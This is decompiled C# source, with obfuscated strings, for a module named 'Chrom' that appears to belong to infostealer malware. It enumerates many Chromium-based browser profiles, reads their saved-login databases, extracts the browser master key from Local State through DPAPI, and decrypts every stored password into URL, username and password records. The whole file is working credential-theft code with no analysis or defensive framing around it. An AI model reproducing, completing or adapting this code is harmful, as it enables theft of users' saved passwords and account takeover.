using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using SmartAssembly.StringsEncoding;

namespace ChromV2
{
	// Token: 0x020000A1 RID: 161
	public class Chrom
	{
		// Token: 0x0600030C RID: 780 RVA: 0x00029950 File Offset: 0x00027B50
		public static List<Account> Grab()
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add(ChromV266351.Strings.Get(107395757), Chrom.LocalApplicationData + ChromV266351.Strings.Get(107395748));
			dictionary.Add(ChromV266351.Strings.Get(107395715), Path.Combine(Chrom.ApplicationData, ChromV266351.Strings.Get(107395738)));
			dictionary.Add(ChromV266351.Strings.Get(107395701), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395660)));
			dictionary.Add(ChromV266351.Strings.Get(107395619), Chrom.LocalApplicationData + ChromV266351.Strings.Get(107395634));
			dictionary.Add(ChromV266351.Strings.Get(107396077), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107396088)));
			dictionary.Add(ChromV266351.Strings.Get(107396055), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107396010)));
			dictionary.Add(ChromV266351.Strings.Get(107395997), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395948)));
			dictionary.Add(ChromV266351.Strings.Get(107395955), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395934)));
			dictionary.Add(ChromV266351.Strings.Get(107395881), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395892)));
			dictionary.Add(ChromV266351.Strings.Get(107395327), Chrom.LocalApplicationData + ChromV266351.Strings.Get(107395274));
			dictionary.Add(ChromV266351.Strings.Get(107395281), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395240)));
			dictionary.Add(ChromV266351.Strings.Get(107395211), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395202)));
			dictionary.Add(ChromV266351.Strings.Get(107395181), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395196)));
			dictionary.Add(ChromV266351.Strings.Get(107395167), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395158)));
			dictionary.Add(ChromV266351.Strings.Get(107395133), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395124)));
			dictionary.Add(ChromV266351.Strings.Get(107395091), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395578)));
			dictionary.Add(ChromV266351.Strings.Get(107395541), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395512)));
			dictionary.Add(ChromV266351.Strings.Get(107395439), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395430)));
			dictionary.Add(ChromV266351.Strings.Get(107395405), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395392)));
			dictionary.Add(ChromV266351.Strings.Get(107395367), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395386)));
			dictionary.Add(ChromV266351.Strings.Get(107395349), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107394792)));
			dictionary.Add(ChromV266351.Strings.Get(107394759), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107394778)));
			dictionary.Add(ChromV266351.Strings.Get(107394721), Path.Combine(Chrom.ApplicationData, ChromV266351.Strings.Get(107394736)));
			dictionary.Add(ChromV266351.Strings.Get(107394635), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107394626)));
			dictionary.Add(ChromV266351.Strings.Get(107394617), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107394608)));
			dictionary.Add(ChromV266351.Strings.Get(107395055), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395066)));
			dictionary.Add(ChromV266351.Strings.Get(107395009), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107395028)));
			dictionary.Add(ChromV266351.Strings.Get(107395003), Path.Combine(Chrom.LocalApplicationData, ChromV266351.Strings.Get(107394950)));
			List<Account> list = new List<Account>();
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				list.AddRange(Chrom.Accounts(keyValuePair.Value, keyValuePair.Key, ChromV266351.Strings.Get(107394917)));
			}
			return list;
		}

		// Token: 0x0600030D RID: 781 RVA: 0x00029DB8 File Offset: 0x00027FB8
		private static List<Account> Accounts(string path, string browser, string table = "logins")
		{
			List<string> allProfiles = Chrom.GetAllProfiles(path);
			List<Account> list = new List<Account>();
			foreach (string text in allProfiles.ToArray())
			{
				if (File.Exists(text))
				{
					SQLiteHandler sqliteHandler;
					try
					{
						sqliteHandler = new SQLiteHandler(text);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
						goto IL_169;
					}
					if (sqliteHandler.ReadTable(table))
					{
						for (int j = 0; j <= sqliteHandler.GetRowCount() - 1; j++)
						{
							try
							{
								string value = sqliteHandler.GetValue(j, ChromV266351.Strings.Get(107394940));
								string value2 = sqliteHandler.GetValue(j, ChromV266351.Strings.Get(107394891));
								string text2 = sqliteHandler.GetValue(j, ChromV266351.Strings.Get(107394902));
								if (text2 != null)
								{
									if (!text2.StartsWith(ChromV266351.Strings.Get(107394849)) && !text2.StartsWith(ChromV266351.Strings.Get(107394876)))
									{
										text2 = Chrom.Decrypt(text2);
									}
									else
									{
										byte[] masterKey = Chrom.GetMasterKey(Directory.GetParent(text).Parent.FullName);
										if (masterKey == null)
										{
											goto IL_172;
										}
										text2 = Chrom.DecryptWithKey(Encoding.Default.GetBytes(text2), masterKey);
									}
									if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(text2))
									{
										list.Add(new Account
										{
											URL = value,
											UserName = value2,
											Password = text2,
											Application = browser
										});
									}
									goto IL_172;
								}
								goto IL_172;
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								goto IL_172;
							}
							break;
							IL_172:;
						}
					}
				}
				IL_169:;
			}
			return list;
		}

		// Token: 0x0600030E RID: 782 RVA: 0x00029F60 File Offset: 0x00028160
		private static List<string> GetAllProfiles(string string_0)
		{
			List<string> list = new List<string>
			{
				string_0 + ChromV266351.Strings.Get(107394871),
				string_0 + ChromV266351.Strings.Get(107394842)
			};
			if (Directory.Exists(string_0))
			{
				foreach (string text in Directory.GetDirectories(string_0))
				{
					if (text.Contains(ChromV266351.Strings.Get(107394281)))
					{
						list.Add(text + ChromV266351.Strings.Get(107394842));
					}
				}
			}
			return list;
		}

		// Token: 0x0600030F RID: 783 RVA: 0x00029FF0 File Offset: 0x000281F0
		public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(encryptedData, 3, array, 0, 12);
			string result;
			try
			{
				byte[] array2 = new byte[encryptedData.Length - 15];
				Array.Copy(encryptedData, 15, array2, 0, encryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				AesGcm aesGcm = new AesGcm();
				result = Encoding.UTF8.GetString(aesGcm.Decrypt(MasterKey, array, null, array4, array3));
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x06000310 RID: 784 RVA: 0x0002A0A4 File Offset: 0x000282A4
		public static byte[] GetMasterKey(string LocalStateFolder)
		{
			string path = LocalStateFolder + ChromV266351.Strings.Get(107394300);
			byte[] array = new byte[0];
			if (!File.Exists(path))
			{
				return null;
			}
			foreach (object obj in new Regex(ChromV266351.Strings.Get(107394251), RegexOptions.Compiled).Matches(File.ReadAllText(path)))
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					array = Convert.FromBase64String(match.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			byte[] result;
			try
			{
				result = ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x06000311 RID: 785 RVA: 0x0002A198 File Offset: 0x00028398
		public static string Decrypt(string encryptedData)
		{
			if (encryptedData != null && encryptedData.Length != 0)
			{
				string result;
				try
				{
					result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
				}
				catch
				{
					result = null;
				}
				return result;
			}
			return null;
		}

		// Token: 0x040001FC RID: 508
		public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x040001FD RID: 509
		public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}
}
